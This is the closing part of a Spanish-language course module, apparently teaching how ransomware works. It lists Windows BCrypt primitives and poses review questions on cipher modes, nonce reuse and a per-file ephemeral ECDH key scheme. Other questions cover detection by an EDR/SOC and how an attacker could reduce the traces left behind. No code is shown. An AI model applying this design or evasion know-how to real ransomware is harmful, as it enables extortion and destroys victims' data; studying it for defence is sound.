| HKDF-SHA256 | Derivar claves desde ECDH | BCrypt nativo (`BCryptKeyDerivation` + `BCRYPT_KDF_HKDF`, Windows 8+) |
| BCryptGenRandom | CSPRNG | BCrypt |


Xtra:

- **Explica la diferencia entre un cifrado de bloque (AES-CBC) y un cifrado de stream (AES-CTR, ChaCha20). ¿Por qué CBC requiere padding y CTR/ChaCha20 no?**

- **¿Qué pasa exactamente si reutilizas el mismo IV + la misma key en dos archivos distintos con CBC?**

- **¿Qué pasa si reutilizas el mismo nonce + la misma key en ChaCha20-Poly1305?**

- **¿Por qué en ChaCha20 se llama "nonce" y en CBC se llama "IV"? ¿Es solo terminología o hay una diferencia funcional?**

- **En el esquema MMP (Multi-Master Pattern) con ECDH efímero por archivo:**
  - ¿Cuántas claves se generan por archivo?
  - ¿Qué clave se destruye inmediatamente y por qué?
  - ¿Qué se guarda en el footer del archivo y por qué es seguro guardarlo ahí?

- **El módulo dice que el MMP no genera tráfico de red durante el cifrado:**
  - ¿Qué IOCs de red buscaría un EDR/SOC para detectar ransomware si no hay C2 durante el cifrado?
  - ¿Qué otros artefactos (disco, memoria, registro) podrían delatar el comportamiento?
  - ¿Cómo podría un atacante minimizar esos artefactos?


**Siguiente**: Módulo 03 — Algoritmos de generación de claves (master key, session key, per-file key)

---

© 2026 Aldair Maihuiri. Todos los derechos reservados. Se permite compartir con atribución al autor. La reproducción sin autorización previa está prohibida.
